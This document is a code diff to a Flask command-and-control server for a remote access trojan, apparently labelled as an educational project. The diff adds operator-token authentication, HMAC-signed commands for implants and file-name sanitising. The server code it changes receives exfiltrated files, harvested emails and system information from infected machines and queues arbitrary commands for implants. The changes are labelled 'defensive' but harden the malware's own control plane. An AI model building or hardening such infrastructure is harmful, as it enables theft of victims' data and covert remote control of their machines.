@@ -12,12 +12,46 @@ from flask import Flask, request, jsonify, render_template_string
 from flask_cors import CORS
 from datetime import datetime
 import base64
+import hashlib
+import hmac
 import json
 import os
 import threading
 
 # Import crypto for decryption
 from crypto_utils import decrypt_payload, derive_key
+
+# ===== OPERATOR AUTHENTICATION (defensive hardening) =====
+# The control plane (/commands/*, /kill_switch/activate, /api/summary) is now
+# protected by a shared operator token sent in the 'Authorization: Bearer <token>'
+# header. Set OPERATOR_TOKEN in the environment; falls back to a demo default.
+OPERATOR_TOKEN = os.environ.get("OPERATOR_TOKEN", "operator-demo-token")
+
+# Signing key for commands sent to implants (distinct from the transport key).
+# Implants verify the HMAC before executing; a MitM cannot forge commands.
+COMMAND_SIGNING_KEY = os.environ.get(
+    "COMMAND_SIGNING_KEY", "rmit-edu-demo-command-signing-key"
+).encode("utf-8")
+
+
+def sign_command(command):
+    """Return an HMAC-SHA256 hex digest for a command string."""
+    return hmac.new(COMMAND_SIGNING_KEY, command.encode("utf-8"), hashlib.sha256).hexdigest()
+
+
+def require_operator_token():
+    """
+    Helper that checks the Authorization header for the operator token.
+    Returns (tuple_response, None) on failure, or (None, auth) on success.
+    Callers use it like:
+        err = require_operator_token()[0]
+        if err: return err
+    """
+    auth = request.headers.get("Authorization", "")
+    expected = f"Bearer {OPERATOR_TOKEN}"
+    if not hmac.compare_digest(auth, expected):
+        return jsonify({"status": "unauthorized"}), 401
+    return None
 
 app = Flask(__name__)
 CORS(app)
@@ -116,6 +150,9 @@ def get_kill_switch():
 @app.route("/kill_switch/activate", methods=["POST"])
 def activate_kill_switch():
     global kill_switch
+    err = require_operator_token()
+    if err:
+        return err
     kill_switch = True
     print("\n[!] KILL SWITCH ACTIVATED - RAT will stop on next check")
     return jsonify({"status": "kill switch activated"})
@@ -169,8 +206,12 @@ def receive_file_content():
     # Save the actual file
     try:
         content = base64.b64decode(file_data["content_b64"])
-        safe_name = file_data["filename"].replace("/", "_").replace("\\", "_")
-        save_path = f"{OUTPUT_DIR}/files/{safe_name}"
+        # Defensive: use only the basename and strip any traversal/unsafe chars.
+        safe_name = os.path.basename(file_data["filename"])
+        safe_name = "".join(c for c in safe_name if c.isalnum() or c in " ._-()")
+        if not safe_name:
+            safe_name = "unnamed_file"
+        save_path = os.path.join(OUTPUT_DIR, "files", safe_name)
         with open(save_path, "wb") as f:
             f.write(content)
         print(f"\n[+] FILE EXFILTRATED: {file_data['filename']} ({file_data['size_bytes']} bytes)")
@@ -585,14 +626,25 @@ def receive_email_harvest():
 
 @app.route("/commands/<rat_id>", methods=["GET"])
 def get_commands(rat_id):
-    """Return queued commands for a RAT and clear the queue."""
+    """Return queued commands for a RAT and clear the queue.
+
+    Polled by implants. Commands are HMAC-signed (see send_command), so an
+    implant rejects any command whose signature does not verify. This endpoint
+    only *reads* the queue for a given rat_id; the mutating operator endpoint
+    (/commands/send) and other control endpoints require an operator token.
+    """
     commands = command_queue.pop(rat_id, [])
+    # Return each queued entry as {command, signature} so implants can verify.
     return jsonify({"commands": commands})
 
 
 @app.route("/commands/send", methods=["POST"])
 def send_command():
-    """Queue a command to be sent to a RAT."""
+    """Queue a command to be sent to a RAT. Operator-authenticated."""
+    err = require_operator_token()
+    if err:
+        return err
+
     data = request.json
     rat_id = data.get("rat_id", "edu_rat_rmit")
     cmd = data.get("command", "")
@@ -600,9 +652,10 @@ def send_command():
     if cmd:
         if rat_id not in command_queue:
             command_queue[rat_id] = []
-        command_queue[rat_id].append(cmd)
-        print(f"\n[>] Command queued for {rat_id}: {cmd[:80]}")
-        return jsonify({"status": "queued", "command": cmd})
+        sig = sign_command(cmd)
+        command_queue[rat_id].append({"command": cmd, "signature": sig})
+        print(f"\n[>] Command queued for {rat_id}: {cmd[:80]} (sig={sig[:12]}...)")
+        return jsonify({"status": "queued", "command": cmd, "signature": sig})
 
     return jsonify({"status": "error", "message": "No command provided"}), 400
 
@@ -817,7 +870,10 @@ Waiting for commands...
                 if (!cmd) return;
                 fetch('/commands/send', {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': 'Bearer {{ operator_token }}'
+                    },
                     body: JSON.stringify({rat_id: 'edu_rat_rmit', command: cmd})
                 }).then(function() {
                     document.getElementById('cmdInput').value = '';
@@ -1088,7 +1144,7 @@ Waiting for commands...
         </div>
     </div>
 
-    <button class="kill-btn" onclick="fetch('/kill_switch/activate', {method:'POST'}).then(()=>location.reload())">
+    <button class="kill-btn" onclick="fetch('/kill_switch/activate', {method:'POST', headers:{'Authorization':'Bearer {{ operator_token }}'}}).then(()=>location.reload())">
         ACTIVATE KILL SWITCH
     </button>
 
@@ -1104,12 +1160,16 @@ Waiting for commands...
 
 @app.route("/")
 def dashboard():
-    return render_template_string(DASHBOARD_HTML, data=received_data, encrypt_on=ENCRYPT_COMMS)
+    return render_template_string(DASHBOARD_HTML, data=received_data, encrypt_on=ENCRYPT_COMMS, operator_token=OPERATOR_TOKEN)
 
 
 @app.route("/api/summary")
 def api_summary():
-    """API endpoint for raw data summary."""
+    """API endpoint for raw data summary. Operator-authenticated."""
+    err = require_operator_token()
+    if err:
+        return err
+
     summary = {
         "connected": received_data["system_info"] is not None,
         "connection_time": received_data["connection_time"],
